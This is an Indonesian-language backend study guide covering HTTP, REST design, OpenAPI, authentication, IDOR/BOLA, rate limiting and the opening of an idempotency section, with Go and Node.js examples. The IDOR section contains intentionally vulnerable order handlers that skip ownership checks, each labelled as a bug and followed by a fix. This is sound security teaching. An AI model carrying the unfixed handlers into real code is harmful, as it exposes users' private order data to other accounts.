# Phase 02 — API Security & Web Security

> Bagian dari [Backend Engineer Roadmap](../README.md)

---

## 10. HTTP Fundamentals

### Apa itu?
HTTP (HyperText Transfer Protocol) adalah protokol request-response yang jadi dasar komunikasi antara client (browser, mobile app, service lain) dan server API seperti OrderFlow. Tiap request punya method (GET, POST, PUT, PATCH, DELETE, dst), path, headers, dan opsional body; tiap response punya status code, headers, dan body.

### Kenapa dibutuhkan?
Semua topik di phase ini — REST design, auth, CORS, rate limiting — dibangun di atas semantik HTTP. Kalau semantik dasarnya salah (misalnya pakai GET buat operasi yang mengubah data, atau salah pilih status code), client jadi gak bisa mengandalkan perilaku standar seperti caching, retry otomatis di browser, atau proxy yang paham HTTP.

### Cara Kerja
```
Client                                  Server
  |-- GET /products/42 HTTP/1.1 ------->|
  |    Host: api.orderflow.com          |
  |    Authorization: Bearer <token>    |
  |                                      |  cari product id 42
  |<-- HTTP/1.1 200 OK ------------------|
  |    Content-Type: application/json   |
  |    {"id":42,"name":"Kabel USB-C"}   |
```
Method menentukan intent (baca/tulis), status code menentukan hasil (2xx sukses, 4xx error di client, 5xx error di server), headers membawa metadata (auth, content type, caching).

### Contoh Kode — Go
```go
package handler

import (
	"encoding/json"
	"net/http"
	"strconv"

	"github.com/go-chi/chi/v5"
)

// GetProduct nunjukin pemakaian status code & header yang benar:
// 200 kalau ketemu, 404 kalau gak ketemu, 400 kalau id-nya invalid.
func GetProduct(w http.ResponseWriter, r *http.Request) {
	id, err := strconv.ParseInt(chi.URLParam(r, "id"), 10, 64)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "invalid product id"})
		return
	}

	product, err := findProductByID(r.Context(), id)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"error": "product not found"})
		return
	}

	// Cache-Control: data produk gak sering berubah, boleh di-cache sebentar
	w.Header().Set("Cache-Control", "public, max-age=60")
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(product)
}
```

### Contoh Kode — Node.js
```javascript
const express = require('express');
const { findProductById } = require('../repositories/productRepository');

const router = express.Router();

// GetProduct nunjukin pemakaian status code & header yang benar:
// 200 kalau ketemu, 404 kalau gak ketemu, 400 kalau id-nya invalid.
router.get('/products/:id', async (req, res) => {
  const id = Number(req.params.id);
  if (Number.isNaN(id)) {
    return res.status(400).json({ error: 'invalid product id' });
  }

  const product = await findProductById(id);
  if (!product) {
    return res.status(404).json({ error: 'product not found' });
  }

  // Cache-Control: data produk gak sering berubah, boleh di-cache sebentar
  res.set('Cache-Control', 'public, max-age=60');
  return res.status(200).json(product);
});

module.exports = router;
```

### Trade-off & Pitfall
- Jangan pakai GET buat operasi yang punya side effect (misal GET `/orders/42/cancel`) — GET dianggap safe & idempotent oleh browser, proxy, dan crawler, jadi bisa ke-trigger tanpa disengaja (prefetch, retry otomatis).
- Status code yang gak akurat (misal selalu balikin 200 dengan `{"success": false}` di body) bikin client harus parsing body buat tau sukses/gagal, padahal HTTP sudah punya mekanisme standar buat itu.
- Headers itu case-insensitive dan bisa muncul lebih dari sekali (misalnya `Set-Cookie`) — jangan asumsikan library HTTP tertentu menangani ini persis sama di semua bahasa.

### Kapan Dipakai
Selalu — ini adalah lapisan paling dasar dari semua komunikasi REST API OrderFlow. Pemahaman method, status code, dan header yang benar jadi prasyarat buat topik-topik selanjutnya di phase ini.

### Sering Ditanya Saat Interview
- "Apa beda idempotent dan safe method di HTTP?" — safe method (GET, HEAD) gak boleh mengubah state server sama sekali; idempotent method (GET, PUT, DELETE) boleh mengubah state tapi hasil akhirnya sama walau dipanggil berkali-kali dengan input yang sama.
- "Kapan pakai 201 vs 200 vs 204?" — 201 buat resource baru yang berhasil dibuat (biasanya POST), 200 buat sukses dengan body response, 204 buat sukses tanpa body (misal DELETE).
- "Apa maksud HTTP itu stateless?" — server gak menyimpan konteks antar request; setiap request harus membawa semua informasi yang dibutuhkan (misalnya token auth), kecuali ada mekanisme tambahan seperti session/cookie.

---

## 11. REST API Design

### Apa itu?
REST (Representational State Transfer) adalah gaya desain API di mana resource (benda/entitas seperti order, product, user) direpresentasikan sebagai URL berbentuk noun, dan aksi terhadap resource itu direpresentasikan lewat HTTP method, bukan lewat kata kerja di URL.

### Kenapa dibutuhkan?
Tanpa konvensi yang konsisten, tiap endpoint OrderFlow bisa punya gaya berbeda-beda (`/getOrder`, `/order/fetch`, `/createNewOrder`) yang bikin API sulit ditebak dan sulit dipelihara. REST design bikin API predictable: begitu klien tau `/orders` itu koleksi order, dia bisa langsung menebak `GET /orders/{id}` buat ambil satu order, `POST /orders` buat bikin baru, tanpa perlu baca dokumentasi tiap endpoint satu-satu.

### Cara Kerja
```
Resource: orders, products, users (noun, plural)

GET    /orders            -> list order (dengan filter/pagination)
POST   /orders             -> bikin order baru
GET    /orders/{id}        -> ambil satu order
PATCH  /orders/{id}        -> update sebagian field order
DELETE /orders/{id}        -> hapus/batalkan order
GET    /orders/{id}/items  -> nested resource: item-item milik order tertentu

GET /products?category=elektronik&page=2&limit=20   -> filtering & pagination lewat query param
```
Nesting dipakai kalau resource anak memang gak punya identitas mandiri di luar resource induknya (order item selalu milik satu order tertentu).

### Contoh Kode — Go
```go
package router

import (
	"net/http"

	"github.com/go-chi/chi/v5"
	"orderflow/internal/auth"
	"orderflow/internal/handler"
)

func New() http.Handler {
	r := chi.NewRouter()

	r.Route("/users", func(r chi.Router) {
		r.Post("/", handler.RegisterUser)          // POST /users -> registrasi
		r.With(auth.Middleware).Get("/{id}", handler.GetUser)
	})

	r.Route("/products", func(r chi.Router) {
		r.Get("/", handler.ListProducts)            // GET /products?category=&page=&limit=
		r.Get("/{id}", handler.GetProduct)
		r.With(auth.Middleware, auth.RequireRole("admin")).Post("/", handler.CreateProduct)
		r.With(auth.Middleware, auth.RequireRole("admin")).Patch("/{id}", handler.UpdateProduct)
	})

	r.Route("/orders", func(r chi.Router) {
		r.Use(auth.Middleware)
		r.Get("/", handler.ListMyOrders)             // GET /orders -> order milik user yang login
		r.Post("/", handler.CreateOrder)
		r.Get("/{id}", handler.GetOrder)
		r.Get("/{id}/items", handler.ListOrderItems) // nested resource
		r.Patch("/{id}", handler.UpdateOrderStatus)
	})

	return r
}
```

### Contoh Kode — Node.js
```javascript
const express = require('express');
const { authenticate } = require('../middleware/authenticate');
const { requireRole } = require('../middleware/requireRole');
const userHandler = require('../handlers/userHandler');
const productHandler = require('../handlers/productHandler');
const orderHandler = require('../handlers/orderHandler');

const app = express();

const userRouter = express.Router();
userRouter.post('/', userHandler.registerUser);              // POST /users -> registrasi
userRouter.get('/:id', authenticate, userHandler.getUser);

const productRouter = express.Router();
productRouter.get('/', productHandler.listProducts);          // GET /products?category=&page=&limit=
productRouter.get('/:id', productHandler.getProduct);
productRouter.post('/', authenticate, requireRole('admin'), productHandler.createProduct);
productRouter.patch('/:id', authenticate, requireRole('admin'), productHandler.updateProduct);

const orderRouter = express.Router();
orderRouter.use(authenticate);
orderRouter.get('/', orderHandler.listMyOrders);               // GET /orders -> order milik user yang login
orderRouter.post('/', orderHandler.createOrder);
orderRouter.get('/:id', orderHandler.getOrder);
orderRouter.get('/:id/items', orderHandler.listOrderItems);   // nested resource
orderRouter.patch('/:id', orderHandler.updateOrderStatus);

app.use('/users', userRouter);
app.use('/products', productRouter);
app.use('/orders', orderRouter);

module.exports = app;
```

### Trade-off & Pitfall
- Hindari kata kerja di URL (`/orders/create`, `/getOrders`) — itu tanda desainnya belum resource-oriented. Aksi non-CRUD yang gak pas jadi noun (misalnya "refund") bisa direpresentasikan sebagai sub-resource: `POST /orders/{id}/refunds`.
- Nesting yang terlalu dalam (`/users/{id}/orders/{id}/items/{id}/reviews/{id}`) bikin URL susah dibaca dan router jadi kompleks — biasanya cukup satu-dua level nesting, sisanya pakai query param atau endpoint terpisah.
- Pagination wajib punya default limit yang wajar — kalau `GET /orders` tanpa param balikin semua row tanpa batas, satu client yang punya jutaan order bisa bikin response raksasa dan membebani database.
- PUT dan PATCH sering disalahgunakan bertukar arti: PUT idealnya replace seluruh resource, PATCH cuma update sebagian field.

### Kapan Dipakai
Cocok untuk API dengan model data berbasis resource yang jelas (seperti order, product, user di OrderFlow) yang dikonsumsi banyak client berbeda (web, mobile, partner). Untuk operasi yang murni berupa "aksi" tanpa representasi resource yang natural (misalnya trigger job batch), kadang RPC-style endpoint (`POST /jobs/recalculate-stock`) lebih jujur daripada dipaksa jadi REST murni.

### Sering Ditanya Saat Interview
- "Gimana cara desain endpoint buat aksi yang bukan CRUD murni, misalnya 'refund order'?" — modelkan sebagai sub-resource (`POST /orders/{id}/refunds`) daripada bikin verb custom di URL.
- "Kapan pakai PUT vs PATCH?" — PUT mengganti seluruh representasi resource (idempotent, field yang gak dikirim bisa jadi ke-reset), PATCH cuma mengubah field yang dikirim.
- "Gimana cara handle pagination yang aman buat dataset besar seperti order history?" — pakai limit & offset atau cursor-based pagination, dengan default & max limit yang dipaksa di server, bukan cuma disarankan ke client.

---

## 12. API Documentation (OpenAPI/Swagger)

### Apa itu?
OpenAPI (dulu disebut Swagger) adalah spesifikasi standar buat mendeskripsikan REST API secara machine-readable: endpoint apa saja yang ada, parameter apa yang diterima, bentuk request/response body, dan skema error — biasanya ditulis dalam YAML/JSON.

### Kenapa dibutuhkan?
Tim frontend, mobile, dan partner eksternal yang mengonsumsi API OrderFlow butuh referensi yang akurat tentang cara pakai tiap endpoint, tanpa harus baca source code backend. Dokumentasi manual (Google Doc, wiki) mudah basi begitu API berubah; OpenAPI spec yang digenerate dari kode atau dijaga dekat dengan kode jauh lebih kecil kemungkinan out-of-sync, dan bisa langsung dipakai buat generate client SDK atau Swagger UI interaktif.

### Cara Kerja
```
Definisikan schema & path di openapi.yaml (atau lewat annotation di kode)
  -> generate/serve spec itu di endpoint seperti /openapi.json
  -> Swagger UI / Redoc membaca spec itu, render jadi halaman dokumentasi interaktif
     yang bisa langsung dipakai buat coba request ("Try it out")
```

### Contoh Kode — Go
```go
// openapi.yaml (disimpan di root project, dipakai sebagai contract):
//
// openapi: 3.0.3
// info:
//   title: OrderFlow API
//   version: 1.0.0
// paths:
//   /orders/{id}:
//     get:
//       summary: Ambil detail satu order
//       security:
//         - bearerAuth: []
//       parameters:
//         - name: id
//           in: path
//           required: true
//           schema: { type: integer }
//       responses:
//         '200':
//           description: Order ditemukan
//           content:
//             application/json:
//               schema: { $ref: '#/components/schemas/Order' }
//         '404':
//           description: Order tidak ditemukan
// components:
//   securitySchemes:
//     bearerAuth: { type: http, scheme: bearer, bearerFormat: JWT }
//   schemas:
//     Order:
//       type: object
//       properties:
//         id: { type: integer }
//         user_id: { type: integer }
//         status: { type: string }
//         total: { type: number }

package handler

import (
	"embed"
	"io"
	"net/http"
)

//go:embed openapi.yaml
var openAPISpec embed.FS

// ServeOpenAPISpec expose file spec-nya secara statis, dipakai Swagger UI
// buat render dokumentasi interaktif tanpa perlu generate ulang saat runtime.
func ServeOpenAPISpec(w http.ResponseWriter, r *http.Request) {
	f, err := openAPISpec.Open("openapi.yaml")
	if err != nil {
		http.Error(w, "spec not found", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	w.Header().Set("Content-Type", "application/yaml")
	io.Copy(w, f)
}
```

### Contoh Kode — Node.js
```javascript
const express = require('express');
const swaggerJsdoc = require('swagger-jsdoc');
const swaggerUi = require('swagger-ui-express');

const swaggerSpec = swaggerJsdoc({
  definition: {
    openapi: '3.0.3',
    info: { title: 'OrderFlow API', version: '1.0.0' },
    components: {
      securitySchemes: {
        bearerAuth: { type: 'http', scheme: 'bearer', bearerFormat: 'JWT' },
      },
    },
  },
  apis: ['./routes/*.js'], // spec di-generate dari JSDoc annotation di tiap route
});

const app = express();
app.use('/docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));
app.get('/openapi.json', (req, res) => res.json(swaggerSpec));

module.exports = app;

/**
 * @openapi
 * /orders/{id}:
 *   get:
 *     summary: Ambil detail satu order
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema: { type: integer }
 *     responses:
 *       200:
 *         description: Order ditemukan
 *       404:
 *         description: Order tidak ditemukan
 */
```

### Trade-off & Pitfall
- Spec yang ditulis manual dan terpisah dari kode gampang basi (endpoint baru lupa didokumentasikan, parameter berubah tapi spec gak diupdate) — pendekatan annotation-in-code (seperti contoh Node.js) atau contract-first (spec jadi source of truth, kode digenerate/divalidasi darinya) mengurangi risiko ini.
- Dokumentasi yang cuma menjelaskan "apa" tanpa contoh request/response nyata kurang membantu — sertakan contoh konkret pakai data OrderFlow (order, product) biar konsumen API gak perlu menebak-nebak.
- Jangan expose Swagger UI interaktif ("Try it out") ke publik tanpa auth kalau API-nya internal — bisa jadi permukaan serangan atau kebocoran struktur internal.

### Kapan Dipakai
Wajib begitu API OrderFlow dikonsumsi lebih dari satu tim atau pihak eksternal (partner logistik, tim mobile, tim frontend yang berbeda repo). Untuk API internal kecil yang cuma dipakai satu service dan berubah cepat, dokumentasi minimal + kode yang jelas kadang cukup, tapi begitu API mulai stabil dan banyak konsumen, OpenAPI spec jadi investasi yang terbayar.

### Sering Ditanya Saat Interview
- "Apa beda contract-first dan code-first buat OpenAPI?" — contract-first berarti spec ditulis dulu sebagai source of truth lalu kode mengikuti/divalidasi terhadapnya; code-first berarti spec digenerate otomatis dari annotation di kode yang sudah ada.
- "Gimana cara memastikan dokumentasi API gak basi?" — integrasikan generation/validasi spec ke CI (misalnya request/response contract test terhadap spec), bukan proses manual yang mudah dilupakan.
- "Apa manfaat OpenAPI spec di luar dokumentasi buat manusia?" — bisa dipakai buat generate client SDK otomatis, mock server buat testing, dan contract testing antara service.

---

## 13. API Authentication

### Apa itu?
API authentication adalah lapisan yang memastikan setiap request ke endpoint OrderFlow membawa identitas yang valid sebelum diteruskan ke business logic. Di Phase 1 sudah dibahas mekanismenya secara detail (JWT, `ValidateToken`/`validateToken`); topik ini fokus ke bagaimana mekanisme itu diterapkan secara konsisten di level API — bukan didefinisikan ulang.

### Kenapa dibutuhkan?
Sebuah REST API biasanya punya puluhan sampai ratusan endpoint, dan gak semuanya boleh diakses publik. Tanpa strategi authentication yang konsisten di level router (bukan ditempel manual di tiap handler), sangat mudah ada satu endpoint yang lupa di-protect — itu salah satu penyebab paling umum data breach di API publik.

### Cara Kerja
```
Router didaftarkan dengan dua grup:
  Public routes   -> POST /auth/login, POST /auth/register, GET /products (baca publik)
  Protected routes -> semua yang butuh identitas: /orders, /users/{id}, dst.
     -> di-wrap middleware auth yang memanggil ValidateToken/validateToken (Phase 1)
     -> gagal validasi -> 401 Unauthorized, request gak pernah sampai ke handler
     -> berhasil -> claims ditempel ke context/request, handler tinggal baca identitasnya
```

### Contoh Kode — Go
```go
package router

import (
	"net/http"

	"github.com/go-chi/chi/v5"
	"orderflow/internal/auth"
	"orderflow/internal/handler"
)

// New mengelompokkan route publik dan protected secara eksplisit,
// supaya gak ada endpoint sensitif yang kelupaan di-pasangi auth.Middleware.
// auth.Middleware ini yang memanggil ValidateToken dari Phase 1.
func New() http.Handler {
	r := chi.NewRouter()

	// --- Public: gak butuh identitas ---
	r.Post("/auth/login", handler.Login)
	r.Post("/auth/register", handler.Register)
	r.Get("/products", handler.ListProducts)

	// --- Protected: wajib Bearer token yang valid ---
	r.Group(func(r chi.Router) {
		r.Use(auth.Middleware)
		r.Get("/orders", handler.ListMyOrders)
		r.Post("/orders", handler.CreateOrder)
		r.Get("/users/{id}", handler.GetUser)
	})

	return r
}
```

### Contoh Kode — Node.js
```javascript
const express = require('express');
const { authenticate } = require('../middleware/authenticate'); // memanggil validateToken dari Phase 1
const authHandler = require('../handlers/authHandler');
const productHandler = require('../handlers/productHandler');
const orderHandler = require('../handlers/orderHandler');
const userHandler = require('../handlers/userHandler');

const app = express();

// --- Public: gak butuh identitas ---
app.post('/auth/login', authHandler.login);
app.post('/auth/register', authHandler.register);
app.get('/products', productHandler.listProducts);

// --- Protected: wajib Bearer token yang valid ---
const protectedRouter = express.Router();
protectedRouter.use(authenticate);
protectedRouter.get('/orders', orderHandler.listMyOrders);
protectedRouter.post('/orders', orderHandler.createOrder);
protectedRouter.get('/users/:id', userHandler.getUser);

app.use('/', protectedRouter);

module.exports = app;
```

### Trade-off & Pitfall
- Grouping route publik/protected secara eksplisit (seperti contoh di atas) jauh lebih aman daripada default-nya "semua public kecuali ditandai" — kalau ada endpoint baru yang lupa ditandai, defaultnya jadi bocor. Idealnya default-nya "semua protected kecuali ditandai publik".
- Pesan error 401 sebaiknya konsisten dan gak membocorkan detail internal (misalnya jangan beda-bedakan pesan antara "token expired" vs "signature invalid" secara terlalu detail ke client, itu memudahkan attacker menebak mekanisme validasi).
- Middleware auth yang salah urutan pemasangan (misalnya rate limiting dipasang setelah auth, bukan sebelum) bisa boros resource — auth check (verifikasi signature JWT) relatif murah tapi endpoint yang expensive computation sebaiknya tetap dilindungi rate limit duluan.

### Kapan Dipakai
Diterapkan di semua endpoint yang mengakses atau mengubah data milik user tertentu (order, payment, profile), kecuali endpoint yang secara eksplisit didesain publik (login, register, katalog produk buat guest).

### Sering Ditanya Saat Interview
- "Gimana caramu mencegah endpoint baru lupa di-protect?" — desain router dengan default "protected", dan pisahkan grup publik secara eksplisit dan minimal, bukan sebaliknya.
- "Kalau token valid tapi user-nya sudah di-nonaktifkan (suspended) di database, apa itu urusan authentication atau authorization?" — itu authorization tambahan di atas authentication; token yang valid secara signature tetap bisa ditolak kalau ada state user yang gak sesuai (misalnya cek status akun setelah `ValidateToken`).
- "Apa risiko kalau pesan error 401 terlalu detail?" — memudahkan attacker melakukan reconnaissance terhadap mekanisme auth (misalnya membedakan user yang ada vs gak ada berdasarkan pesan error).

---

## 14. API Authorization (IDOR/BOLA)

### Apa itu?
IDOR (Insecure Direct Object Reference) — juga dikenal sebagai BOLA (Broken Object Level Authorization, item #1 di OWASP API Security Top 10) — adalah bug di mana API sudah benar melakukan authentication (tau siapa yang request), tapi lupa memverifikasi apakah identitas itu memang berhak mengakses object spesifik yang diminta lewat ID di URL.

### Kenapa dibutuhkan?
Ini salah satu vulnerability paling umum dan paling merusak di REST API, karena gampang banget ditemukan attacker: cukup ganti angka ID di URL (`/orders/101` jadi `/orders/102`) dan lihat apakah bisa akses order orang lain. Endpoint yang authenticated tapi gak authorized-per-object kelihatan "aman" secara sekilas karena ada `auth.Middleware` terpasang, padahal itu cuma menjawab "siapa kamu", bukan "apakah order ini milikmu".

### Cara Kerja
```
BUG (IDOR/BOLA):
  GET /orders/{id} -> auth.Middleware validasi token -> ambil order by id -> return
                       (order milik siapapun langsung dibalikin, gak ada cek ownership)

FIX:
  GET /orders/{id} -> auth.Middleware validasi token -> ambil order by id
                    -> cek: order.user_id == claims.UserID (atau role admin)?
                       -> tidak -> 403/404
                       -> ya    -> return
```

### Contoh Kode — Go
Versi **bermasalah** — persis seperti yang sering lolos code review karena ada `auth.Middleware`, tapi cuma cek "sudah login", bukan "punya order ini":
```go
// BUG: cuma authentication (siapa yang login), gak ada authorization per-object.
// User manapun yang login bisa baca order siapapun cukup dengan mengganti {id} di URL.
func GetOrder(w http.ResponseWriter, r *http.Request) {
	orderID, err := strconv.ParseInt(chi.URLParam(r, "id"), 10, 64)
	if err != nil {
		http.Error(w, "invalid order id", http.StatusBadRequest)
		return
	}

	order, err := findOrderByID(r.Context(), orderID)
	if err != nil {
		http.Error(w, "order not found", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(order) // <- langsung dibalikin, tanpa cek kepemilikan
}
```
Versi **fixed**:
```go
func GetOrder(w http.ResponseWriter, r *http.Request) {
	claims, ok := r.Context().Value(auth.ClaimsContextKey).(*auth.Claims)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	orderID, err := strconv.ParseInt(chi.URLParam(r, "id"), 10, 64)
	if err != nil {
		http.Error(w, "invalid order id", http.StatusBadRequest)
		return
	}

	order, err := findOrderByID(r.Context(), orderID)
	if err != nil {
		http.Error(w, "order not found", http.StatusNotFound)
		return
	}

	// FIX: object-level authorization — order ini emang punya user yang request?
	if order.UserID != claims.UserID && claims.Role != "admin" {
		// balikin 404, bukan 403, biar attacker gak bisa mastiin order dengan id itu "ada tapi bukan miliknya"
		http.Error(w, "order not found", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(order)
}
```

### Contoh Kode — Node.js
Versi **bermasalah**:
```javascript
// BUG: cuma authentication, gak ada authorization per-object.
router.get('/orders/:id', authenticate, async (req, res) => {
  const orderId = Number(req.params.id);
  const order = await findOrderById(orderId);
  if (!order) {
    return res.status(404).json({ error: 'order not found' });
  }
  return res.json(order); // <- langsung dibalikin, tanpa cek kepemilikan
});
```
Versi **fixed**:
```javascript
router.get('/orders/:id', authenticate, async (req, res) => {
  const orderId = Number(req.params.id);
  if (Number.isNaN(orderId)) {
    return res.status(400).json({ error: 'invalid order id' });
  }

  const order = await findOrderById(orderId);
  if (!order) {
    return res.status(404).json({ error: 'order not found' });
  }

  // FIX: object-level authorization — order ini emang punya user yang request?
  const isOwner = order.user_id === req.user.userId;
  const isAdmin = req.user.role === 'admin';
  if (!isOwner && !isAdmin) {
    // balikin 404, bukan 403, biar attacker gak bisa mastiin order dengan id itu "ada tapi bukan miliknya"
    return res.status(404).json({ error: 'order not found' });
  }

  return res.json(order);
});
```

### Trade-off & Pitfall
- Balikin 403 vs 404 buat resource yang bukan milik user itu trade-off information disclosure: 403 membocorkan "resource ini ada tapi bukan milikmu" (memudahkan enumeration ID valid), 404 lebih aman tapi kadang bikin debugging klien lebih susah bedain "gak ada" vs "gak berhak".
- IDOR gak cuma di GET — POST/PATCH/DELETE yang menerima ID resource lewat body atau URL sama-sama rentan (misalnya `PATCH /orders/{id}` yang gak cek ownership sebelum update).
- Cek ownership yang cuma dilakukan di satu endpoint tapi lupa di endpoint lain untuk resource yang sama (misalnya sudah benar di `GET /orders/{id}` tapi lupa di `GET /orders/{id}/items`) — pertimbangkan bikin helper/middleware `RequireOrderOwnership` yang dipakai ulang di semua endpoint terkait order.
- Menyembunyikan ID asli di frontend (misalnya cuma menampilkan order yang "seharusnya" milik user) bukan mitigasi — attacker tetap bisa panggil API langsung dengan ID sembarang; validasi HARUS di backend.

### Kapan Dipakai
Wajib diterapkan di setiap endpoint yang menerima resource ID lewat path/body dan resource itu punya konsep kepemilikan (order, payment, alamat pengiriman user) — bukan cuma resource yang memang publik seperti katalog produk.

### Sering Ditanya Saat Interview
- "Apa beda IDOR dan BOLA?" — pada dasarnya konsep yang sama; IDOR adalah nama klasik dari OWASP Top 10 web, BOLA adalah penamaan yang dipakai OWASP API Security Top 10 untuk kasus spesifik di context API dengan object ID.
- "Gimana caramu mencegah IDOR secara sistematis, bukan cuma per-endpoint?" — sentralisasi logic ownership check jadi helper/middleware yang dipakai ulang, plus review checklist khusus "setiap endpoint yang terima resource ID wajib ada ownership/role check" di code review.
- "Kenapa lebih aman balikin 404 daripada 403 untuk resource yang bukan milik user?" — 403 mengonfirmasi resource dengan ID itu benar-benar ada, yang membantu attacker melakukan ID enumeration; 404 gak membedakan antara "gak ada" dan "ada tapi bukan milikmu".

---

## 15. Rate Limiting

### Apa itu?
Rate limiting adalah mekanisme membatasi jumlah request yang boleh dilakukan satu client (per user, per IP, atau per API key) dalam periode waktu tertentu, dan menolak request yang melebihi batas itu dengan status `429 Too Many Requests`.

### Kenapa dibutuhkan?
Tanpa rate limit, satu client (baik karena bug di sisi mereka, traffic spike, atau memang serangan brute-force/scraping) bisa membanjiri OrderFlow dengan request sampai database dan service lain kehabisan resource, mengganggu semua user lain. Endpoint sensitif seperti `POST /auth/login` khususnya butuh rate limit buat mempersulit brute-force password.

### Cara Kerja
```
Request masuk -> ambil identitas client (user_id kalau ada, atau IP)
  -> key := "ratelimit:" + clientID + ":" + window saat ini
  -> INCR key di Redis
  -> kalau baru dibuat (hasil INCR == 1) -> set EXPIRE = window duration
  -> kalau hasil INCR > limit -> 429 Too Many Requests, sertakan header Retry-After
  -> kalau masih <= limit -> lanjut ke handler
```
Ini adalah pola fixed window counter — sederhana dan cukup untuk kebutuhan umum, walau punya keterbatasan (dibahas di Trade-off).

### Contoh Kode — Go
```go
package middleware

import (
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/redis/go-redis/v9"
	"orderflow/internal/auth"
)

// RateLimitMiddleware membatasi jumlah request per client (per user ID kalau
// sudah authenticated, atau per IP untuk endpoint publik) dalam satu window waktu.
func RateLimitMiddleware(rdb *redis.Client, limit int, window time.Duration) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			clientID := clientIdentifier(r)

			bucket := time.Now().Unix() / int64(window.Seconds())
			key := fmt.Sprintf("ratelimit:%s:%d", clientID, bucket)

			count, err := rdb.Incr(r.Context(), key).Result()
			if err != nil {
				// Redis down: fail-open supaya rate limiter yang bermasalah gak
				// bikin seluruh API down; trade-off, lihat bagian Trade-off & Pitfall.
				next.ServeHTTP(w, r)
				return
			}
			if count == 1 {
				rdb.Expire(r.Context(), key, window)
			}

			if count > int64(limit) {
				w.Header().Set("Retry-After", strconv.Itoa(int(window.Seconds())))
				http.Error(w, "rate limit exceeded", http.StatusTooManyRequests)
				return
			}

			next.ServeHTTP(w, r)
		})
	}
}

func clientIdentifier(r *http.Request) string {
	if claims, ok := r.Context().Value(auth.ClaimsContextKey).(*auth.Claims); ok {
		return fmt.Sprintf("user:%d", claims.UserID)
	}
	return "ip:" + r.RemoteAddr
}
```
Pemakaian — login endpoint dibatasi lebih ketat karena rawan brute-force:
```go
r.With(middleware.RateLimitMiddleware(rdb, 5, time.Minute)).
	Post("/auth/login", handler.Login)

r.With(auth.Middleware, middleware.RateLimitMiddleware(rdb, 100, time.Minute)).
	Get("/orders", handler.ListMyOrders)
```

### Contoh Kode — Node.js
```javascript
function clientIdentifier(req) {
  if (req.user) {
    return `user:${req.user.userId}`;
  }
  return `ip:${req.ip}`;
}

// rateLimitMiddleware membatasi jumlah request per client dalam satu window waktu.
function rateLimitMiddleware(redisClient, limit, windowMs) {
  return async (req, res, next) => {
    const clientId = clientIdentifier(req);
    const windowSeconds = Math.floor(windowMs / 1000);
    const bucket = Math.floor(Date.now() / windowMs);
    const key = `ratelimit:${clientId}:${bucket}`;

    let count;
    try {
      count = await redisClient.incr(key);
      if (count === 1) {
        await redisClient.expire(key, windowSeconds);
      }
    } catch (err) {
      // Redis down: fail-open supaya rate limiter yang bermasalah gak
      // bikin seluruh API down; trade-off, lihat bagian Trade-off & Pitfall.
      return next();
    }

    if (count > limit) {
      res.set('Retry-After', String(windowSeconds));
      return res.status(429).json({ error: 'rate limit exceeded' });
    }

    return next();
  };
}

module.exports = { rateLimitMiddleware };
```
Pemakaian — login endpoint dibatasi lebih ketat karena rawan brute-force:
```javascript
const { rateLimitMiddleware } = require('../middleware/rateLimitMiddleware');
const redisClient = require('../redisClient');

app.post('/auth/login', rateLimitMiddleware(redisClient, 5, 60_000), authHandler.login);
app.get('/orders', authenticate, rateLimitMiddleware(redisClient, 100, 60_000), orderHandler.listMyOrders);
```

### Trade-off & Pitfall
- Fixed window counter (contoh di atas) punya celah "burst di boundary": client bisa kirim `limit` request di detik terakhir window pertama, lalu `limit` request lagi di detik pertama window berikutnya — total `2x limit` dalam waktu singkat. Sliding window atau token bucket lebih akurat, tapi lebih kompleks diimplementasikan.
- Fail-open (kalau Redis down, request tetap diloloskan) menjaga availability API, tapi berarti rate limit gak berfungsi sama sekali saat Redis bermasalah — fail-closed lebih aman tapi bisa bikin API total down kalau Redis down. Pilihannya tergantung mana yang lebih costly untuk bisnis OrderFlow.
- Rate limit per-IP gampang salah kena kalau banyak user berada di belakang NAT/proxy yang sama (kantor, mobile carrier) — mereka semua kelihatan seperti satu client. Kalau user sudah authenticated, rate limit per-user_id lebih akurat.
- Limit yang terlalu ketat bikin user legitimate ketolak; terlalu longgar gak efektif mencegah abuse — perlu disesuaikan per endpoint (login jauh lebih ketat daripada baca katalog produk).

### Kapan Dipakai
Wajib di endpoint yang rawan brute-force atau abuse (login, register, forgot-password, endpoint pencarian yang berat), dan sangat disarankan sebagai default umum di seluruh API publik buat melindungi dari traffic spike/bug klien, walau dengan limit yang lebih longgar dibanding endpoint sensitif.

### Sering Ditanya Saat Interview
- "Apa beda fixed window, sliding window, dan token bucket buat rate limiting?" — fixed window sederhana tapi rawan burst di boundary; sliding window lebih akurat menghitung request dalam window bergerak; token bucket memodelkan "kuota" yang terisi ulang bertahap, cocok untuk traffic yang naturally bursty.
- "Gimana cara rate limiting bekerja kalau API OrderFlow di-deploy di banyak instance/pod?" — counter harus disimpan di storage terpusat seperti Redis (bukan in-memory per instance), supaya semua instance menghitung dari sumber yang sama.
- "Kalau Redis yang jadi storage rate limiter down, apa yang terjadi ke API?" — tergantung strategi fail-open/fail-closed; fail-open menjaga API tetap jalan tanpa proteksi rate limit sementara, fail-closed lebih aman tapi bisa bikin API ikut down.

---

## 16. Idempotency

### Apa itu?
Idempotency di level API berarti request yang sama, kalau dikirim berkali-kali (misalnya karena client retry setelah timeout), cuma diproses efeknya sekali. Ini biasanya diimplementasikan lewat `Idempotency-Key` header yang dikirim client — sebuah ID unik yang sama dipakai ulang kalau request yang sama di-retry.

### Kenapa dibutuhkan?
